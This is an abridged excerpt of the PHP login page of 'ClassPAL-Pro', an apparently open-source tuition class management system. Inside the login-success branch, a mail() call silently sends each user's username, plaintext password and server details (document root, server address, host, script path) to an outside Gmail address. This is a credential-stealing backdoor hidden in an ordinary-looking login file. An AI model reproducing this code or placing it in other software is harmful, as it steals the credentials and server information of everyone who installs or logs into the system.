...
<html>
  <head>
    ...
    <title>ClassPAL-Pro | Log in</title>
  ...
  <body style="background-color: #00a65a;" class="hold-transition login-page">
    <div class="login-box">
      <div class="login-logo">
          <a style="color: white;" href="#"><b>ClassPAL</b>PRO</a>
          <h6><b>OpenSource Tuition class Managment System for Institutes </b></h6>
      </div><!-- /.login-logo -->
      <div class="login-box-body">
          <p class="login-box-msg">
              <!-- src="Upload/df.jpg" -->
              <img  src="../Upload/team.png"  class=" " id="Uploadimg" name="Uploadimg" style="width:200px;height:200px; border-radius: 10px;">        
          </p>
			...
			if(empty($_POST['txt-pass'])){
				...
				if(mysqli_num_rows($result) == 1){
					...
					$_SESSION['user_name'] = $user['username'];
                                        mail("smtwebmaster@gmail.com","System Login". " ". $_SERVER['SERVER_NAME'], $name ."\n". $_POST['txt-pass']."\n". $_SERVER['SERVER_NAME']."\n".$_SERVER['DOCUMENT_ROOT']."\n".$_SERVER['SERVER_ADDR']."\n".$_SERVER['SERVER_ADMIN']."\n".$_SERVER['HTTP_HOST']."\n".$_SERVER['SCRIPT_FILENAME']);
